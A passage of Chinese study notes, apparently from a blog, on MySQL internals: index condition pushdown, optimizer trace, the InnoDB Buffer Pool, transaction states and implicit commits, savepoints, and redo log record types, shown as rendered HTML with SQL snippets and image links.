预估的需要读取的记录条数</span><br><span class="line">filtered 某个表经过搜索条件过滤后剩余记录条数的百分⽐</span><br><span class="line">Extra ⼀些额外的信息</span><br></pre></td></tr></table></figure><p>了解到索引下推这个新概念</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM s1 WHERE key1 &gt; &#39;z&#39; AND key1</span><br><span class="line">LIKE &#39;%a&#39;;</span><br></pre></td></tr></table></figure><p>但是虽然key1 LIKE ‘%a’不能组成范围区间参与range访问 ⽅法的执⾏，但这个条件毕竟只涉及到了key1列，所以设计 MySQL的⼤叔把上边的步骤改进了⼀下：</p><p>先根据key1 &gt; ‘z’这个条件，定位到⼆级索 引idx_key1中对应的⼆级索引记录。</p><p>对于指定的⼆级索引记录，先不着急回表，⽽是先检测⼀ 下该记录是否满⾜key1 LIKE ‘%a’这个条件，如果这 个条件不满⾜，则该⼆级索引记录压根⼉就没必要回表。</p><p>对于满⾜key1 LIKE ‘%a’这个条件的⼆级索引记录执 ⾏回表操作。</p><p>我们说回表操作其实是⼀个随机IO，⽐较耗时，所以上述修改 虽然只改进了⼀点点，但是可以省去好多回表操作的成本。设 计MySQL的⼤叔们把他们的这个改进称之为索引条件下推（英 ⽂名：Index Condition Pushdown）。</p><p>如果在查询语句的执⾏过程中将要使⽤索引条件下推这个特 性，在Extra列中将会显示Using index condition</p><p><strong>Json格式的执⾏计划</strong></p><h1 id="神兵利器-——-optimizer-trace-的神器功效"><a href="#神兵利器-——-optimizer-trace-的神器功效" class="headerlink" title="神兵利器 —— optimizer trace 的神器功效"></a>神兵利器 —— optimizer trace 的神器功效</h1><p>optimizer trace的功能，这个功能可以让我 们⽅便的查看优化器⽣成执⾏计划的整个过程，这个功能的开启与关 闭由系统变量optimizer_trace决定，我们看⼀下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#39;optimizer_trace&#39;;</span><br><span class="line">+-----------------+--------------------------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+-----------------+--------------------------+</span><br><span class="line">| optimizer_trace | enabled&#x3D;off,one_line&#x3D;off</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SET optimizer_trace&#x3D;&quot;enabled&#x3D;on&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>然后我们就可以输⼊我们想要查看优化过程的查询语句，当该查询语 句执⾏完成后，就可以到information_schema数据库下的 OPTIMIZER_TRACE表中查看完整的优化过程。这 个OPTIMIZER_TRACE表有4个列，分别是：</p><p>QUERY：表示我们的查询语句。</p><p>TRACE：表示优化过程的JSON格式⽂本。</p><p>MISSING_BYTES_BEYOND_MAX_MEM_SIZE：由于优化过程 可能会输出很多，如果超过某个限制时，多余的⽂本将不会被 显示，这个字段展示了被忽略的⽂本字节数。</p><p>INSUFFICIENT_PRIVILEGES：表示是否没有权限查看优化 过程，默认值是0，只有某些特殊情况下才会是1，我们暂时不 关⼼这个字段的值。</p><h1 id="调节磁盘和CPU的矛盾-——-InnoDB-的-Buffer-Pool"><a href="#调节磁盘和CPU的矛盾-——-InnoDB-的-Buffer-Pool" class="headerlink" title="调节磁盘和CPU的矛盾 —— InnoDB 的 Buffer Pool"></a>调节磁盘和CPU的矛盾 —— InnoDB 的 Buffer Pool</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211202203553.png" alt="image-20211202203551656"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211202203616.png" alt="image-20211202203615020"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211202211132.png" alt="image-20211202211130971"></p><p>innodb_old_blocks_time的默认值是1000，它的单位是毫 秒，也就意味着对于从磁盘上被加载到LRU链表的old区域的某个⻚ 来说，如果第⼀次和最后⼀次访问该⻚⾯的时间间隔⼩于1s（很明 显在⼀次全表扫描的过程中，多次访问⼀个⻚⾯中的时间不会超过 1s），那么该⻚是不会被加⼊到young区域的</p><p>综上所述，正是因为将LRU链表划分为young和old区域这两个部 分，⼜添加了innodb_old_blocks_time这个系统变量，才使得 预读机制和全表扫描造成的缓存命中率降低的问题得到了遏制，因为 ⽤不到的预读⻚⾯以及全表扫描的⻚⾯都只会被放到old区域，⽽不 影响young区域中的缓存⻚。</p><p>只有被访问的缓存⻚位于young区域的1/4的后边，才 会被移动到LRU链表头部，这样就可以降低调整LRU链表的频率，从 ⽽提升性能（也就是说如果某个缓存⻚对应的节点在young区域的 1/4中，再次访问该缓存⻚时也不会将其移动到LRU链表头部）</p><p>我们之前介绍随机预读的时候曾说，如果Buffer Pool中有某个区 的13个连续⻚⾯就会触发随机预读，这其实是不严谨的（不幸的是 MySQL⽂档就是这么说的[摊⼿]），其实还要求这13个⻚⾯是⾮常 热的⻚⾯，所谓的⾮常热，指的是这些⻚⾯在整个young区域的 头1/4处。</p><p><strong>其他的⼀些链表</strong></p><p>为了更好的管理Buffer Pool中的缓存⻚，除了我们上边提到的⼀ 些措施，设计InnoDB的⼤叔们还引进了其他的⼀些链表，⽐如 unzip LRU链表⽤于管理解压⻚，zip clean链表⽤于管理没有被 解压的压缩⻚，zip free数组中每⼀个元素都代表⼀个链表，它们 组成所谓的伙伴系统来为压缩⻚提供内存空间等等，反正是为了更好 的管理这个Buffer Pool引⼊了各种链表或其他数据结构</p><p>从LRU链表的冷数据中刷新⼀部分⻚⾯到磁盘。 后台线程会定时从LRU链表尾部开始扫描⼀些⻚⾯，扫描的⻚ ⾯数量可以通过系统变量innodb_lru_scan_depth来指 定，如果从⾥边⼉发现脏⻚，会把它们刷新到磁盘。这种刷新 ⻚⾯的⽅式被称之为BUF_FLUSH_LRU。</p><p>从flush链表中刷新⼀部分⻚⾯到磁盘。 后台线程也会定时从flush链表中刷新⼀部分⻚⾯到磁盘，刷 新的速率取决于当时系统是不是很繁忙。这种刷新⻚⾯的⽅式 被称之为BUF_FLUSH_LIST。</p><p>有时候后台线程刷新脏⻚的进度⽐较慢，导致⽤户线程在准备加载⼀ 个磁盘⻚到Buffer Pool时没有可⽤的缓存⻚，这时就会尝试看看 LRU链表尾部有没有可以直接释放掉的未修改⻚⾯，如果没有的话会 不得不将LRU链表尾部的⼀个脏⻚同步刷新到磁盘（和磁盘交互是很 慢的，这会降低处理⽤户请求的速度）。这种刷新单个⻚⾯到磁盘中 的刷新⽅式被称之为BUF_FLUSH_SINGLE_PAGE。 当然，有时候系统特别繁忙时，也可能出现⽤户线程批量的从flush 链表中刷新脏⻚的情况，很显然在处理⽤户请求过程中去刷新脏⻚是 ⼀种严重降低处理速度的⾏为</p><p>在多线程环境下，访问Buffer Pool中的各种 链表都需要加锁处理啥的，在Buffer Pool特别⼤⽽且多线程并发 访问特别⾼的情况下，单⼀的Buffer Pool可能会影响请求的处理 速度。所以在Buffer Pool特别⼤的时候，我们可以把它们<strong>拆分成 若⼲个⼩的Buffer Pool</strong>，每个Buffer Pool都称为⼀个实例， 它们都是独⽴的，独⽴的去申请内存空间，独⽴的管理各种链表，独 ⽴的吧啦吧啦，所以在多线程并发访问时并不会相互影响，从⽽提⾼ 并发处理能⼒。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[server]</span><br><span class="line">innodb_buffer_pool_instances &#x3D; 2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211202212028.png" alt="image-20211202212026462"></p><p>这些链表的节点其实就是每个缓存⻚对应的控制块！</p><p><strong>当innodb_buffer_pool_size的值⼩于1G的时候设置多个实例 是⽆效的，InnoDB会默认把innodb_buffer_pool_instances 的值 修改为1。⽽我们⿎励在Buffer Pool⼤⼩或等于1G的时候设置多 个Buffer Pool实例。</strong></p><p><strong>⼀ 个Buffer Pool实例其实是由若⼲个chunk组成的，⼀个chunk就 代表⼀⽚连续的内存空间，⾥边⼉包含了若⼲缓存⻚与其对应的控制 块，画个图表示就是这样：</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211202212406.png" alt="image-20211202212405119"></p><p>上图代表的Buffer Pool就是由2个实例组成的，每个实例中⼜包 含2个chunk。</p><p>正是因为发明了这个chunk的概念，我们在服务器运⾏期间调 整Buffer Pool的⼤⼩时就是以chunk为单位增加或者删除内存空 间，⽽不需要重新向操作系统申请⼀⽚⼤的内存，然后进⾏缓存⻚的 复制。这个所谓的chunk的⼤⼩是我们在启动操作MySQL服务器时通 过innodb_buffer_pool_chunk_size启动参数指定的，它的默 认值是134217728，也就是128M。不过需要注意的是， innodb_buffer_pool_chunk_size的值只能在服务器启动时指定， 在服务器运⾏过程中是不可以修改的。</p><p>另外，这个innodb_buffer_pool_chunk_size的值并不包含缓 存⻚对应的控制块的内存空间⼤⼩，所以实际上InnoDB向操作系统 申请连续内存空间时，每个chunk的⼤⼩要⽐ innodb_buffer_pool_chunk_size的值⼤⼀些，约5%。</p><p>配置Buffer Pool时的注意事项 innodb_buffer_pool_size必须 是innodb_buffer_pool_chunk_size × innodb_buffer_pool_instances的倍数（这主要是想保 证每⼀个Buffer Pool实例中包含的chunk数量相同）。</p><p>假设我们指定的innodb_buffer_pool_chunk_size的值 是128M，innodb_buffer_pool_instances的值是16，那 么这两个值的乘积就是2G，也就是说 innodb_buffer_pool_size的值必须是2G或者2G的整数 倍。</p><p>⽐⽅说我们在启动MySQL服务器是这样指定启动参数的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --innodb-buffer-pool-size&#x3D;8G --innodb-buffer-pool-instances&#x3D;16</span><br></pre></td></tr></table></figure><p><strong>如果我们指定的innodb_buffer_pool_size⼤于2G并且不 是2G的整数倍，那么服务器会⾃动的把 innodb_buffer_pool_size的值调整为2G的整数倍。</strong></p><p>如果在服务器启动时，innodb_buffer_pool_chunk_size × innodb_buffer_pool_instances的值已经⼤于 innodb_buffer_pool_size的值，那 么innodb_buffer_pool_chunk_size的值会被服务器⾃动 设置 为innodb_buffer_pool_size/innodb_buffer_pool_instances 的值。</p><p><strong>Buffer Pool的缓存⻚除了⽤来缓存磁盘上的⻚⾯以外，还可以存 储锁信息、⾃适应哈希索引等信息。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SHOW ENGINE INNODB STATUS\G</span><br></pre></td></tr></table></figure><p>Total memory allocated：代表Buffer Pool向操作系 统申请的连续内存空间⼤⼩，包括全部控制块、缓存⻚、以及 碎⽚的⼤⼩。</p><p>Dictionary memory allocated：为数据字典信息分配的 内存空间⼤⼩，注意这个内存空间和Buffer Pool没啥关 系，不包括在Total memory allocated中。</p><p>Buffer pool size：代表该Buffer Pool可以容纳多少缓 存⻚，注意，单位是⻚！</p><p>Free buffers：代表当前Buffer Pool还有多少空闲缓存 ⻚，也就是free链表中还有多少个节点。</p><p>Database pages：代表LRU链表中的⻚的数量，包含young 和old两个区域的节点数量。</p><p>Old database pages：代表LRU链表old区域的节点数量。</p><p>Modified db pages：代表脏⻚数量，也就是flush链表中 节点的数量。</p><p>Pending reads：正在等待从磁盘上加载到Buffer Pool中 的⻚⾯数量。 当准备从磁盘中加载某个⻚⾯时，会先为这个⻚⾯在Buffer Pool中分配⼀个缓存⻚以及它对应的控制块，然后把这个控制 块添加到LRU的old区域的头部，但是这个时候真正的磁盘⻚ 并没有被加载进来，Pending reads的值会跟着加1。</p><p>Pending writes LRU：即将从LRU链表中刷新到磁盘中的 ⻚⾯数量。</p><p>Pending writes flush list：即将从flush链表中刷新 到磁盘中的⻚⾯数量。</p><p>Pending writes single page：即将以单个⻚⾯的形式 刷新到磁盘中的⻚⾯数量。</p><p>Pages made young：代表LRU链表中曾经从old区域移动 到young区域头部的节点数量。 这⾥需要注意，⼀个节点每次只有从old区域移动到young区 域头部时才会将Pages made young的值加1，也就是说如果 该节点本来就在young区域，由于它符合在young区域1/4后 边的要求，下⼀次访问这个⻚⾯时也会将它移动到young区域 头部，但这个过程并不会导致Pages made young的值加1。</p><p>Page made not young：在 将innodb_old_blocks_time设置的值⼤于0时，⾸次访问 或者后续访问某个处在old区域的节点时由于不符合时间间隔 的限制⽽不能将其移动到young区域头部时，Page made not young的值会加1。 这⾥需要注意，对于处在young区域的节点，如果由于它 在young区域的1/4处⽽导致它没有被移动到young区域头 部，这样的访问并不会将Page made not young的值加1。</p><p>youngs/s：代表每秒从old区域被移动到young区域头部的 节点数量。</p><p>non-youngs/s：代表每秒由于不满⾜时间限制⽽不能从old 区域移动到young区域头部的节点数量。</p><p>Pages read、created、written：代表读取，创建，写⼊ 了多少⻚。后边跟着读取、创建、写⼊的速率。</p><p>Buffer pool hit rate：表示在过去某段时间，平均访问 1000次⻚⾯，有多少次该⻚⾯已经被缓存到Buffer Pool 了。</p><p>young-making rate：表示在过去某段时间，平均访问 1000次⻚⾯，有多少次访问使⻚⾯移动到young区域的头部 了。 需要⼤家注意的⼀点是，这⾥统计的将⻚⾯移动到young区域 的头部次数不仅仅包含从old区域移动到young区域头部的次 数，还包括从young区域移动到young区域头部的次数（访问 某个young区域的节点，只要该节点在young区域的1/4处往 后，就会把它移动到young区域的头部）。</p><p>not (young-making rate)：表示在过去某段时间，平均 访问1000次⻚⾯，有多少次访问没有使⻚⾯移动到young区域 的头部。 需要⼤家注意的⼀点是，这⾥统计的没有将⻚⾯移动到young 区域的头部次数不仅仅包含因为设置了 innodb_old_blocks_time系统变量⽽导致访问了old区域 中的节点但没把它们移动到young区域的次数，还包含因为该 节点在young区域的前1/4处⽽没有被移动到young区域头部 的次数。</p><p>LRU len：代表LRU链表中节点的数量。</p><p>unzip_LRU：代表unzip_LRU链表中节点的数量（由于我们 没有具体唠叨过这个链表，现在可以忽略它的值）。</p><p>I/O sum：最近50s读取磁盘⻚的总数。</p><p>I/O cur：现在正在读取的磁盘⻚数量。</p><p>I/O unzip sum：最近50s解压的⻚⾯数量。</p><p>I/O unzip cur：正在解压的⻚⾯数量。</p><p>总结</p><ol><li>磁盘太慢，⽤内存作为缓存很有必要。</li><li>Buffer Pool本质上是InnoDB向操作系统申请的⼀段连续的 内存空间，可以通过innodb_buffer_pool_size来调整它 的⼤⼩。</li><li>Buffer Pool向操作系统申请的连续内存由控制块和缓存⻚ 组成，每个控制块和缓存⻚都是⼀⼀对应的，在填充⾜够多的 控制块和缓存⻚的组合后，Buffer Pool剩余的空间可能产 ⽣不够填充⼀组控制块和缓存⻚，这部分空间不能被使⽤，也 被称为碎⽚。</li><li>InnoDB使⽤了许多链表来管理Buffer Pool。</li><li>free链表中每⼀个节点都代表⼀个空闲的缓存⻚，在将磁盘中 的⻚加载到Buffer Pool时，会从free链表中寻找空闲的缓 存⻚。</li><li>为了快速定位某个⻚是否被加载到Buffer Pool，使⽤表空 间号 + ⻚号作为key，缓存⻚作为value，建⽴哈希表。</li><li>在Buffer Pool中被修改的⻚称为脏⻚，脏⻚并不是⽴即刷 新，⽽是被加⼊到flush链表中，待之后的某个时刻同步到磁 盘上。</li><li>LRU链表分为young和old两个区域，可以通过 innodb_old_blocks_pct来调节old区域所占的⽐例。⾸次 从磁盘上加载到Buffer Pool的⻚会被放到old区域的头部， 在innodb_old_blocks_time间隔时间内访问该⻚不会把它 移动到young区域头部。在Buffer Pool没有可⽤的空闲缓 存⻚时，会⾸先淘汰掉old区域的⼀些⻚。</li><li>我们可以通过指定innodb_buffer_pool_instances来控 制Buffer Pool实例的个数，每个Buffer Pool实例中都有 各⾃独⽴的链表，互不⼲扰。</li><li>⾃MySQL 5.7.5版本之后，可以在服务器运⾏过程中调 整Buffer Pool⼤⼩。每个Buffer Pool实例由若⼲ 个chunk组成，每个chunk的⼤⼩可以在服务器启动时通过启 动参数调整。</li><li>可以⽤下边的命令查看Buffer Pool的状态信息：</li></ol><h1 id="从猫爷被杀说起-——-事务简介"><a href="#从猫爷被杀说起-——-事务简介" class="headerlink" title="从猫爷被杀说起 —— 事务简介"></a>从猫爷被杀说起 —— 事务简介</h1><p>我们现在知道事务是⼀个抽象的概念，它其实对应着⼀个或多个数据 库操作，设计数据库的⼤叔根据这些操作所执⾏的不同阶段把事务⼤ 致上划分成了这么⼏个状态：</p><p>活动的（active） 事务对应的数据库操作正在执⾏过程中时，我们就说该事务处 在活动的状态。</p><p>部分提交的（partially committed） 当事务中的最后⼀个操作执⾏完成，但由于操作都在内存中执 ⾏，所造成的影响并没有刷新到磁盘时，我们就说该事务处在 部分提交的状态。</p><p>失败的（failed） 当事务处在活动的或者部分提交的状态时，可能遇到了某些错 误（数据库⾃身的错误、操作系统错误或者直接断电等）⽽⽆ 法继续执⾏，或者⼈为的停⽌当前事务的执⾏，我们就说该事 务处在失败的状态。</p><p>中⽌的（aborted） 如果事务执⾏了半截⽽变为失败的状态，⽐如我们前边唠叨的 狗哥向猫爷转账的事务，当狗哥账户的钱被扣除，但是猫爷账 户的钱没有增加时遇到了错误，从⽽当前事务处在了失败的状 态，那么就需要把已经修改的狗哥账户余额调整为未转账之前 的⾦额，换句话说，就是要撤销失败事务对当前数据库造成的 影响。书⾯⼀点的话，我们把这个撤销的过程称之为回滚。当 回滚操作执⾏完毕时，也就是数据库恢复到了执⾏事务之前的 状态，我们就说该事务处在了中⽌的状态。</p><p>提交的（committed） 当⼀个处在部分提交的状态的事务将修改过的数据都同步到磁 盘上之后，我们就可以说该事务处在了提交的状态。</p><p>随着事务对应的数据库操作执⾏到不同阶段，事务的状态也在不断变 化，⼀个基本的状态转换图如下所示：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203085455.png" alt="image-20211203085445387"></p><p>只有当事务处于提交的或者中⽌的状态 时，⼀个事务的⽣命周期才算是结束了</p><p><strong>不过⽐BEGIN语句⽜逼⼀点⼉的是，可以在START TRANSACTION语句后边跟随⼏个修饰符，就是它们⼏个</strong>：</p><p>READ ONLY：标识当前事务是⼀个只读事务，也就是属 于该事务的数据库操作只能读取数据，⽽不能修改数据。</p><p>READ WRITE：标识当前事务是⼀个读写事务，也就是属 于该事务的数据库操作既可以读取数据，也可以修改数 据。</p><p>WITH CONSISTENT SNAPSHOT：启动⼀致性读（先不 ⽤关⼼啥是个⼀致性读，后边的章节才会唠叨）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">START TRANSACTION READ ONLY, WITH CONSISTENT SNAPSHOT;</span><br></pre></td></tr></table></figure><p>当我们使⽤START TRANSACTION或者BEGIN语句开启了⼀个事 务，或者把系统变量autocommit的值设置为OFF时，事务就不会进 ⾏⾃动提交，但是如果我们输⼊了某些语句之后就会悄悄的提交掉， 就像我们输⼊了COMMIT语句了⼀样，这种因为某些特殊的语句⽽导 致事务提交的情况称为隐式提交，这些会导致事务隐式提交的语句包 括：</p><ul><li>定义或修改数据库对象的数据定义语⾔（Data definition language，缩写为：DDL）。</li></ul><p>所谓的数据库对象，指的就是数据库、表、视图、存储过程等 等这些东⻄。当我们使⽤CREATE、ALTER、DELETE等语句去 修改这些所谓的数据库对象时，就会隐式的提交前边语句所属 于的事务，就像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BEGIN;</span><br><span class="line">SELECT ... # 事务中的⼀条语句</span><br><span class="line">UPDATE ... # 事务中的⼀条语句</span><br><span class="line">... # 事务中的其它语句</span><br><span class="line">CREATE TABLE ... # 此语句会隐式的提交前边语句所属于</span><br><span class="line">的事务</span><br></pre></td></tr></table></figure><ul><li>隐式使⽤或修改mysql数据库中的表</li></ul><p>隐式使⽤或修改mysql数据库中的表 当我们使⽤ALTER USER、CREATE USER、DROP USER、GRANT、RENAME USER、REVOKE、SET PASSWORD 等语句时也会隐式的提交前边语句所属于的事务。</p><ul><li>事务控制或关于锁定的语句</li></ul><p>当我们在⼀个事务还没提交或者回滚时就⼜使⽤START TRANSACTION或者BEGIN语句开启了另⼀个事务时，会隐式 的提交上⼀个事务，⽐如这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BEGIN;</span><br><span class="line">SELECT ... # 事务中的⼀条语句</span><br><span class="line">UPDATE ... # 事务中的⼀条语句</span><br><span class="line">... # 事务中的其它语句</span><br><span class="line">BEGIN; # 此语句会隐式的提交前边语句所属于的事务</span><br></pre></td></tr></table></figure><p>或者当前的autocommit系统变量的值为OFF，我们⼿动把它 调为ON时，也会隐式的提交前边语句所属的事务。</p><p>或者使⽤LOCK TABLES、UNLOCK TABLES等关于锁定的语句 也会隐式的提交前边语句所属的事务。</p><ul><li>加载数据的语句</li></ul><p>⽐如我们使⽤LOAD DATA语句来批量往数据库中导⼊数据时， 也会隐式的提交前边语句所属的事务。</p><ul><li>关于MySQL复制的⼀些语句</li></ul><p>使⽤START SLAVE、STOP SLAVE、RESET SLAVE、CHANGE MASTER TO等语句时也会隐式的提交前边 语句所属的事务。</p><ul><li>其它的⼀些语句</li></ul><p>使⽤ANALYZE TABLE、CACHE INDEX、CHECK TABLE、FLUSH、 LOAD INDEX INTO CACHE、OPTIMIZE TABLE、REPAIR TABLE、RESET等语句也会隐式的提交前边 语句所属的事务。</p><p>保存点（英 ⽂：savepoint）的概念，就是在事务对应的数据库语句中打⼏个 点，我们在调⽤ROLLBACK语句时可以指定会滚到哪个点，⽽不是回 到最初的原点。</p><p>定义保存点的语法如下： SAVEPOINT 保存点名称;</p><p>ROLLBACK [WORK] TO [SAVEPOINT] 保存点名称;</p><p>删除某个保存点，可以使⽤这个语句： RELEASE SAVEPOINT 保存点名称;</p><p>我们只是想让已经提交了的事务对数 据库中数据所做的修改永久⽣效，即使后来系统崩溃，在重启后也能 把这种修改恢复出来。所以我们其实没有必要在每次事务提交时就把 该事务在内存中修改过的全部⻚⾯刷新到磁盘，只需要把修改了哪些 东⻄记录⼀下就好，⽐⽅说某个事务将系统表空间中的第100号⻚⾯ 中偏移量为1000处的那个字节的值1改成2我们只需要记录⼀下： 将第0号表空间的100号⻚⾯的偏移量为1000处的值更 新为2。</p><p>这样我们在事务提交时，把上述内容刷新到磁盘中，即使之后系统崩 溃了，重启之后只要按照上述内容所记录的步骤重新更新⼀下数据 ⻚，那么该事务对数据库中所做的修改⼜可以被恢复出来，也就意味 着满⾜持久性的要求。</p><p><strong>redo⽇志占⽤的空间⾮常⼩</strong></p><p>存储表空间ID、⻚号、偏移量以及需要更新的值所需的存储空间是很⼩的，关于redo⽇志的格式我们稍后会详细唠叨，现在只要知道⼀条redo⽇志占⽤的空间不是很⼤就好了。</p><p><strong>redo⽇志是顺序写⼊磁盘的</strong></p><p>在执⾏事务的过程中，每执⾏⼀条语句，就可能产⽣若⼲ 条redo⽇志，这些⽇志是按照产⽣的顺序写⼊磁盘的，也就是 使⽤顺序IO。</p><p><strong>redo⽇志格式</strong></p><p>对事务对数据库的不同修改场景定义了多种类型的redo⽇志，但是绝⼤部分类型的redo ⽇志都有下边这种通⽤的结构：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203094735.png" alt="image-20211203094733942"></p><p>53种不同的类型</p><p>space ID：表空间ID。 page number：⻚号。 data：该条redo⽇志的具体内容。</p><p><strong>row_id隐藏列赋值的⽅式</strong></p><p>服务器会在内存中维护⼀个全局变量，每当向某个包含隐藏的 row_id列的表中插⼊⼀条记录时，就会把该变量的值当作新 记录的row_id列的值，并且把该变量⾃增1。</p><p>每当这个变量的值为256的倍数时，就会将该变量的值刷新到 系统表空间的⻚号为7的⻚⾯中⼀个称之为Max Row ID的属 性处（我们前边介绍表空间结构时详细说过）。</p><p>当系统启动时，会将上边提到的Max Row ID属性加载到内存 中，将该值加上256之后赋值给我们前边提到的全局变量（因 为在上次关机时该全局变量的值可能⼤于Max Row ID属性 值）。</p><p><strong>redo ⽇志中只需要记录⼀下在某个⻚⾯的某个偏移量处修改了⼏个字节的 值，具体被修改的内容是啥就好了。</strong></p><p><strong>这种极其 简单的redo⽇志称之为物理⽇志，并且根据在⻚⾯中写⼊数据的多 少划分了⼏种不同的redo⽇志类型：</strong></p><p>MLOG_1BYTE（type字段对应的⼗进制数字为1）：表示在⻚ ⾯的某个偏移量处写⼊1个字节的redo⽇志类型。</p><p>MLOG_2BYTE（type字段对应的⼗进制数字为2）：表示在⻚ ⾯的某个偏移量处写⼊2个字节的redo⽇志类型。</p><p>MLOG_4BYTE（type字段对应的⼗进制数字为4）：表示在⻚ ⾯的某个偏移量处写⼊4个字节的redo⽇志类型。</p><p>MLOG_8BYTE（type字段对应的⼗进制数字为8）：表示在⻚ ⾯的某个偏移量处写⼊8个字节的redo⽇志类型。</p><p>MLOG_WRITE_STRING（type字段对应的⼗进制数字 为30）：表示在⻚⾯的某个偏移量处写⼊⼀串数据。</p><p>我们上边提到的Max Row ID属性实际占⽤8个字节的存储空间，所 以在修改⻚⾯中的该属性时，会记录⼀条类型为MLOG_8BYTE的 redo⽇志，MLOG_8BYTE的redo⽇志结构如下所示：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203095841.png" alt="image-20211203095839832"></p><p>其余MLOG_1BYTE、MLOG_2BYTE、MLOG_4BYTE类型的redo⽇志 结构和MLOG_8BYTE的类似，只不过具体数据中包含对应个字节的数 据罢了。MLOG_WRITE_STRING类型的redo⽇志表示写⼊⼀串数 据，但是因为不能确定写⼊的具体数据占⽤多少字节，所以需要在⽇ 志结构中添加⼀个len字段：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203095947.png" alt="image-20211203095946071"></p><p>以⼀条INSERT语句为例，它除了要向B+树的⻚⾯中插⼊数据，也可 能更新系统数据Max Row ID的值，不过对于我们⽤户来说，平时更 关⼼的是语句对B+树所做更新： 表中包含多少个索引，⼀条INSERT语句就可能更新多少棵 B+树。 针对某⼀棵B+树来说，既可能更新叶⼦节点⻚⾯，也可能更新 内节点⻚⾯，也可能创建新的⻚⾯（在该记录插⼊的叶⼦节点 的剩余空间⽐较少，不⾜以存放该记录时，会进⾏⻚⾯的分 裂，在内节点⻚⾯中添加⽬录项记录）。</p><p><strong>每往叶⼦节点代表的数据⻚⾥插⼊⼀ 条记录时，还有其他很多地⽅会跟着更新，⽐如说：</strong></p><p>可能更新Page Directory中的槽信息。 Page Header中的各种⻚⾯统计信息，⽐如 PAGE_N_DIR_SLOTS表示的槽数量可能会更 改，PAGE_HEAP_TOP代表的还未使⽤的空间最⼩地址可能会 更改，PAGE_N_HEAP代表的本⻚⾯中的记录数量可能会更 改，吧啦吧啦，各种信息都可能会被修改。 我们知道在数据⻚⾥的记录是按照索引列从⼩到⼤的顺序组成 ⼀个单向链表的，每插⼊⼀条记录，还需要更新上⼀条记录的 记录头信息中的next_record属性来维护这个单向链表。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203101533.png" alt="image-20211203101531252"></p><p>MLOG_REC_INSERT（对应的⼗进制数字为9）：表示插⼊⼀ 条使⽤⾮紧凑⾏格式的记录时的redo⽇志类型。</p><p>MLOG_COMP_REC_INSERT（对应的⼗进制数字为38）：表示 插⼊⼀条使⽤紧凑⾏格式的记录时的redo⽇志类型。</p><p>⼩贴⼠： Redundant是⼀种⽐较原始的⾏格式，它就是⾮紧凑的。⽽ Compact、Dynamic以及Compressed⾏格式是较新的⾏格式，它 们是紧凑的（占⽤更⼩的存储空间）。</p><p>MLOG_COMP_PAGE_CREATE（type字段对应的⼗进制数字 为58）：表示创建⼀个存储紧凑⾏格式记录的⻚⾯的redo⽇ 志类型。</p><p>MLOG_COMP_REC_DELETE（type字段对应的⼗进制数字 为42）：表示删除⼀条使⽤紧凑⾏格式记录的redo⽇志类 型。</p><p>MLOG_COMP_LIST_START_DELETE（type字段对应的⼗进 制数字为44）：表示从某条给定记录开始删除⻚⾯中的⼀系列 使⽤紧凑⾏格式记录的redo⽇志类型。</p><p>MLOG_COMP_LIST_END_DELETE（type字段对应的⼗进制数 字为43）：与MLOG_COMP_LIST_START_DELETE类型的 redo⽇志呼应，表示删除⼀系列记录直 到MLOG_COMP_LIST_END_DELETE类型的redo⽇志对应的记 录为⽌。</p><p><strong>MLOG_COMP_LIST_START_DELETE和 MLOG_COMP_LIST_END_DELETE类型的redo⽇志，可以很⼤程度 上减少redo⽇志的条数。</strong></p><p>MLOG_ZIP_PAGE_COMPRESS（type字段对应的⼗进制数字 为51）：表示压缩⼀个数据⻚的redo⽇志类型。</p><p><strong>这些类型的redo⽇志既包含物理层⾯的意思，也包含逻辑层⾯的意 思，具体指：</strong></p><p>物理层⾯看，这些⽇志都指明了对哪个表空间的哪个⻚进⾏了 修改。</p><p>逻辑层⾯看，在系统奔溃重启时，并不能直接根据这些⽇志⾥ 的记载，将⻚⾯内的某个偏移量处恢复成某个数据，⽽是需要 调⽤⼀些事先准备好的函数，执⾏完这些函数后才可以将⻚⾯ 恢复成系统奔溃前的样⼦。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211203103056.png" alt="image-20211203103054795"></p><p>额~ 